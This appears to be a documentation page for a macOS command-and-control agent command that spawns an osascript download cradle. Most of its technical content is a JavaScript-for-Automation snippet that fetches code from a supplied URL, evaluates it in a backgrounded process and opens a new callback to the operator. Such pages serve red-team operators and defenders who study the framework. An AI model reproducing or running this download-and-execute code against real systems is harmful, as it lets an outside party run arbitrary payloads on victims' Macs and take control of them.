+++
title = "spawn_download_cradle"
chapter = false
weight = 100
hidden = false
+++

## Summary

Spawn a new osascript download cradle as a backgrounded process to launch a new callback 
- Needs Admin: False  
- Version: 1  
- Author: @its_a_feature_  

### Arguments

#### url

- Description: full URL of hosted payload  
- Required Value: True  
- Default Value: None  

## Usage

```
spawn_download_cradle 
```


## Detailed Summary
Uses the same execution technique as the `run` command to launch a backgrounded `osascript` binary with a download cradle:
```JavaScript
let path = "/usr/bin/osascript";
let args = ['-l','JavaScript','-e'];
let command = "eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding($.NSData.dataWithContentsOfURL($.NSURL.URLWithString(";
command = command + "'" + full_url + "')),$.NSUTF8StringEncoding)));";
args.push(command);
args.push("&");
try{
    let pipe = $.NSPipe.pipe;
    let file = pipe.fileHandleForReading;  // NSFileHandle
    let task = $.NSTask.alloc.init;
    task.launchPath = path;
    task.arguments = args;
    task.standardOutput = pipe;
    task.standardError = pipe;
    task.launch;
}
```

This doesn't generate a new payload, it just pulls down and executes the payload hosted at `url`.

